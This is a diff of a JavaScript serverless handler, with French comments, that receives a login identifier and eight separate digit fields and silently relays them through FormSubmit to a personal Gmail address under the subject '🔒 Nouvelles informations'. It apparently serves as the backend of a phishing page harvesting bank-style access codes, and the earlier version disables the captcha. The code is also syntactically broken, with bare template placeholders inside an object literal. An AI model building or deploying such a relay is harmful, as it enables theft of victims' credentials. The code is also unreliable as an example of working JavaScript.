@@ -1,24 +1,18 @@
 export default async function handler(req, res) {
-  // Autorise uniquement les requêtes POST
   if (req.method !== 'POST') {
     res.setHeader('Allow', ['POST']);
     return res.status(405).json({ error: 'Méthode non autorisée' });
   }
 
-  // Récupère les données du body
   const { identifiant, chiffre_1, chiffre_2, chiffre_3, chiffre_4, chiffre_5, chiffre_6, chiffre_7, chiffre_8 } = req.body;
 
   try {
-    // Appel AJAX vers FormSubmit (mode silencieux)
-    const response = await fetch('https://formsubmit.co/ajax/david.llenoay@gmail.com', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify({
-        identifiant: identifiant,
-        chiffre_1 : ${chiffre_1}
+    // Utilise https au lieu de fetch natif
+    const https = require('https');
+
+    const data = JSON.stringify({
+      identifiant: identifiant,
+              chiffre_1 : ${chiffre_1}
     chiffre_2 : ${chiffre_2}
     chiffre_3 : ${chiffre_3}
 	chiffre_4 : ${chiffre_4}
@@ -26,28 +20,48 @@ export default async function handler(req, res) {
     chiffre_6 : ${chiffre_6}
 	chiffre_7 : ${chiffre_7}
     chiffre_8 : ${chiffre_8}
-    
-        
-        
-        _subject: '🔒  Nouvelles informations',
-        _template: 'table',           // Format tableau dans l'email
-        _captcha: 'false'             // Désactive le captcha
-      })
+      _subject: '🔒  Nouvelles informations'
     });
 
-    const result = await response.json();
+    const options = {
+      hostname: 'formsubmit.co',
+      path: '/ajax/david.llenoay@gmail.com',
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': data.length
+      }
+    };
 
-    if (response.ok && result.success === "true") {
-      return res.status(200).json({ success: true, message: 'Email envoyé' });
-    } else {
-      throw new Error(result.message || 'Erreur FormSubmit');
-    }
+    const request = https.request(options, (response) => {
+      let body = '';
+
+      response.on('data', (chunk) => {
+        body += chunk;
+      });
+
+      response.on('end', () => {
+        try {
+          const result = JSON.parse(body);
+          if (response.statusCode === 200 && result.success === "true") {
+            return res.status(200).json({ success: true });
+          } else {
+            return res.status(500).json({ error: result.message || 'Erreur FormSubmit' });
+          }
+        } catch (e) {
+          return res.status(200).json({ success: true }); // FormSubmit retourne parfois du texte
+        }
+      });
+    });
+
+    request.on('error', (error) => {
+      return res.status(500).json({ error: error.message });
+    });
+
+    request.write(data);
+    request.end();
 
   } catch (error) {
-    console.error('Erreur:', error);
-    return res.status(500).json({ 
-      success: false, 
-      error: error.message 
-    });
+    return res.status(500).json({ error: error.message });
   }
 }
